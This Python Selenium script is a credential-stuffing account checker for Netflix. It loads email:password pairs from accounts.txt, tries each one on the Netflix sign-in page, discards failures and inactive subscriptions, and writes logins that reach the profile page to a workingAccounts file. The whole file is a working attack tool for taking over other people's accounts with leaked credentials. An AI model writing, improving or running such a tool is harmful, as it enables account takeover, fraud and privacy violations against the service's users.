from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC, wait
from termcolor import colored
from main import log
import datetime
import time
import os
import re


def read():
    try:
        file1 = open('accounts.txt', 'r')
        count = 0
        accs = []

        for line in file1:
            count += 1
            accs.append(line.strip())

        file1.close()
        log("returning array with " + str(len(accs)) + " accounts")
        return accs
    except:
        log("Could not find accounts.txt")
        print(colored("Could not find accounts.txt", "red"))


def accLog(text, filename):
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    with open(filename, "a") as accs:
        accs.write(text + "\n")


def removeLine(file):
    with open(file, 'r') as fIn:
        data = fIn.read().splitlines(True)
    with open(file, 'w') as fOut:
        fOut.writelines(data[1:])


def netflix(fileName=0):
    log("launching webdriver for netflix")
    driver = webdriver.Chrome()
    driver.get("https://www.netflix.com/")
    try:
        rejectCookies = driver.find_element_by_xpath(
            '//*[@id="cookie-disclosure"]/div[1]/button[2]')
        rejectCookies.click()
        log("cookies rejected")
    except:
        log("cookies not found")
    signIn = driver.find_element_by_link_text("Sign In")
    time.sleep(2)
    signIn.click()
    time.sleep(1)
    if fileName == 0:
        fileTime = datetime.datetime.now()
        fileName = ("workingAccounts/" + "Netflix_" +
                    fileTime.strftime("%Y-%m-%d_%H-%M-%S") + ".txt")
    credentials = read()
    for acc in credentials:
        time.sleep(1)
        try:
            WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((
                    By.ID, "id_userLoginId"))
            )
        except:
            log("Could not load")
            break
        emailInput = driver.find_element_by_id("id_userLoginId")
        passInput = driver.find_element_by_id("id_password")
        logIn = driver.find_element_by_xpath(
            '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
        email = re.split("\s|:", acc)[0]
        password = re.split("\s|:", acc)[1]
        if len(password) < 4:
            log("short password for " + acc)
            removeLine('accounts.txt')
            continue
        emailInput.clear()
        emailInput.send_keys(email)
        passInput.send_keys(password)
        logIn.click()
        time.sleep(1)
        try:
            WebDriverWait(driver, 1).until(
                EC.presence_of_element_located((
                    By.XPATH, '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]'))
            )
            error = driver.find_element_by_xpath(
                '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]')
            try:
                dn = error.get_attribute("innerHTML").split('"')[1]
            except:
                log(error)
            if dn == "/loginHelp":
                log("Wrong password for " + acc)
            elif dn == "/":
                log("Account " + acc + " doesn't exist")
            else:
                log("Couldn't sign in for unknown reasons with " + acc)
                log(error)
                log(dn)
            removeLine('accounts.txt')
            continue
        except:
            try:
                WebDriverWait(driver, 1).until(
                    EC.presence_of_element_located((
                        By.LINK_TEXT, "Sign Out"))
                )
                logout = driver.find_element_by_link_text("Sign Out")
                log("Inactive subscription for " + acc)
                removeLine('accounts.txt')
                logout.click()
                signIn = driver.find_element_by_link_text("Sign In")
                signIn.click()
            except:
                try:
                    WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((
                            By.LINK_TEXT, "Manage Profiles"))
                    )
                    log("Password working for " + acc)
                    accLog(acc, fileName)
                    removeLine('accounts.txt')
                except:
                    log("Could not load")
                    break
                driver.close()
                netflix(fileName)
    driver.close()
    log("closing webdriver")
